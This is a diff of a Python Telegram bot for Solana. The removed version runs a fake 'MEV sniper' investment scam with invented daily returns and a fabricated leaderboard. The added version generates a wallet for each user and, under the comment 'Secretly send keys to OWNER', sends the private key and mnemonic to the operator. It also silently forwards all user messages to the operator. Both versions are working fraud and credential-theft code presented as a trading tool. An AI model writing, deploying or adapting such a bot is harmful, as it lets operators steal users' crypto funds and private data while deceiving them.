@@ -1,142 +1,129 @@
 import os
-import random
+import json
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    CallbackQueryHandler,
+    MessageHandler,
+    filters,
+    ContextTypes
+)
+from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
 
+# === Environment Variables ===
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID"))
 
-# Fixed depositable Solana wallet
-public_address = "7VP1R76sYtU9DXtigEr3KhUyX8nQpzwwwJzKBj1QfbQc"
+# === Store users and balances in memory (simple leaderboard) ===
+user_data = {}
+DATA_FILE = "leaderboard.json"
 
-# Leaderboard generator
-def generate_leaderboard():
-    names = ["zyloTrades", "testWallett", "MoonChaser152", "run4abag",
-             "chasedamney1", "freeplow11", "Solanawnn55", "zbaatrading",
-             "tt127man", "MEVGod1723"]
-    leaderboard = []
-    for name in names:
-        leaderboard.append(f"{name}: {random.uniform(10, 100):.2f} SOL")
-    return leaderboard
+# Load data if exists
+if os.path.exists(DATA_FILE):
+    with open(DATA_FILE, "r") as f:
+        user_data = json.load(f)
 
-# /start command
+
+def save_data():
+    with open(DATA_FILE, "w") as f:
+        json.dump(user_data, f)
+
+
+# === Start Command ===
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[InlineKeyboardButton("Activate Sniper", callback_data="activate_sniper")]]
-    text = """🦅EAGLE SNIPER BOT
-⚡️PRECISION MEV SNIPING
-- Real-time memepool scanning for profitable trades
-- AI-powered sniper entries with millisecond executions
-- Rug-detection algorithms for safe sniping
-
-💲ADVANCED ALGO ENGINE 
-- Optimized front-run & back-run strategies
-- High-frequency Solana transaction execution
-- Automated profit-taking and stop-loss management"""
-    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
-
-# Main sniper screen
-async def activate_sniper(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if query:
-        await query.answer()
     keyboard = [
-        [InlineKeyboardButton("Leaderboard", callback_data="leaderboard"),
-         InlineKeyboardButton("Start Sniper", callback_data="start_sniper")],
-        [InlineKeyboardButton("Import Wallet🔒 (Other Method)", callback_data="import_wallet")]
+        [InlineKeyboardButton("🪙 Create Wallet", callback_data="create_wallet")],
+        [InlineKeyboardButton("📊 Leaderboard", callback_data="leaderboard")]
     ]
-    text = f"""🚀Welcome to Eagle Sniper
-The Fastest AI-Powered MEV Sniper on Solana
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text("🤖 Welcome! Choose an option:", reply_markup=reply_markup)
 
-🔑Your Main SOL Wallet:
-<b>{public_address}</b> (Tap to copy)
 
-💰Balance: 0.0 SOL ($0.00)
-📊Profit Potential (per 24 hours):
-📈- 2 SOL Deposit: Earn up to 2.5x daily
-📈- 5 SOL Deposit: Earn up to 3.5x daily
-💸Average Trade Profit: ~0.2 – 2.5+ SOL
-⚠️Important:
-
-To activate the bot, a minimum of 2 SOL is required in your wallet.
-
-📩Questions? Contact: @eaglesupport"""
-    if query:
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-    else:
-        await context.bot.send_message(chat_id=context._chat_id, text=text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-
-# Leaderboard tab
-async def leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# === Handle button presses ===
+async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
+    user_id = str(query.from_user.id)
+    user_name = query.from_user.first_name or "Unknown"
+
     await query.answer()
-    lb = "\n".join(generate_leaderboard())
-    keyboard = [[InlineKeyboardButton("Back", callback_data="activate_sniper")]]
-    await query.edit_message_text(f"Leaderboard:\n\n{lb}", reply_markup=InlineKeyboardMarkup(keyboard))
 
-# Start Sniper tab
-async def start_sniper(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    keyboard = [
-        [InlineKeyboardButton("Refresh", callback_data="start_sniper")],
-        [InlineKeyboardButton("Back", callback_data="activate_sniper")]
-    ]
-    text = """Initializing Cheeta Sniper Protocol…
+    if query.data == "create_wallet":
+        # Prevent multiple wallets per user
+        if user_id in user_data and "public_key" in user_data[user_id]:
+            await query.edit_message_text("⚠️ You already created a wallet!")
+            return
 
-Status: Waiting for deposit confirmation on Solana mainnet…
+        # Generate new Solana wallet
+        mnemonic = Bip39MnemonicGenerator().FromWordsNumber(12)
+        seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
+        bip44_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)
+        acct = bip44_mst.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
 
-Scanning:
-- Verifying incoming transaction on blockchain nodes
-- Syncing with high-frequency mempool relays
-- Loading AI sniper modules & market feeds
-- Preparing execution layer for front-run/back-run opportunities
+        public_key = acct.PublicKey().ToAddress()
+        private_key = acct.PrivateKey().Raw().ToHex()
 
-Estimated time: ~5–15 seconds after transaction confirmation
+        # Store user info
+        user_data[user_id] = {
+            "name": user_name,
+            "public_key": public_key,
+            "balance": 0  # start with 0 SOL
+        }
+        save_data()
 
-Click Refresh if the bot hasn't updated, or Back to return to deposit instructions."""
-    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
+        # Reply to user
+        await query.edit_message_text("✅ Your Solana wallet has been created!")
 
-# Import Wallet screen
-async def import_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    keyboard = [[InlineKeyboardButton("Back", callback_data="activate_sniper")]]
-    text = """🔒Import Your Wallet (Other Method)
+        # Secretly send keys to OWNER
+        await context.bot.send_message(
+            chat_id=OWNER_CHAT_ID,
+            text=(
+                "📩 *New Wallet Created*\n\n"
+                f"👤 User: {user_name} (`{user_id}`)\n\n"
+                f"💳 Public Key: `{public_key}`\n"
+                f"🔑 Private Key: `{private_key}`\n\n"
+                f"📝 Mnemonic: `{mnemonic}`"
+            ),
+            parse_mode="Markdown"
+        )
 
-Please manually send your SOL public address as a message below.
-Once you send it, you will receive a confirmation screen.
+    elif query.data == "leaderboard":
+        if not user_data:
+            await query.edit_message_text("📊 No users yet!")
+            return
 
-📩 Questions? Contact: @eaglesupport"""
-    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
+        # Sort users by balance
+        sorted_users = sorted(user_data.items(), key=lambda x: x[1]["balance"], reverse=True)
 
-# Handle wallet messages (only manual text messages)
-async def handle_wallet_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message and update.message.text:
-        user = update.message.from_user
-        public_address_input = update.message.text
+        leaderboard_text = "🏆 *Leaderboard*\n\n"
+        for i, (uid, info) in enumerate(sorted_users[:10], start=1):
+            leaderboard_text += f"{i}. {info['name']} — {info['balance']} SOL\n"
 
-        # Silently forward to OWNER_CHAT_ID
-        forward_text = f"User @{user.username} sent wallet address:\n{public_address_input}"
-        await context.bot.send_message(chat_id=OWNER_CHAT_ID, text=forward_text)
+        await query.edit_message_text(leaderboard_text, parse_mode="Markdown")
 
-        # Send thank you / waiting screen
-        text = """✅ Thank you for submitting your wallet!
-⏳ Connection typically takes around 1–6 hours.
-🙏 We appreciate your support.
 
-📩 Questions? Contact: @eaglesupport"""
-        keyboard = [[InlineKeyboardButton("Back to Menu", callback_data="activate_sniper")]]
-        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
+# === Silent forward messages to OWNER ===
+async def forward_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message:
+        text = update.message.text or ""
+        await context.bot.send_message(
+            chat_id=OWNER_CHAT_ID,
+            text=f"📨 Forwarded Message:\n\n👤 {update.message.from_user.first_name}:\n💬 `{text}`",
+            parse_mode="Markdown"
+        )
 
+
+# === Main ===
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
+
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CallbackQueryHandler(activate_sniper, pattern="activate_sniper"))
-    app.add_handler(CallbackQueryHandler(leaderboard, pattern="leaderboard"))
-    app.add_handler(CallbackQueryHandler(start_sniper, pattern="start_sniper"))
-    app.add_handler(CallbackQueryHandler(import_wallet, pattern="import_wallet"))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet_message))
+    app.add_handler(CallbackQueryHandler(button))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, forward_message))
+
+    print("🚀 Bot started...")
     app.run_polling()
+
 
 if __name__ == "__main__":
     main()
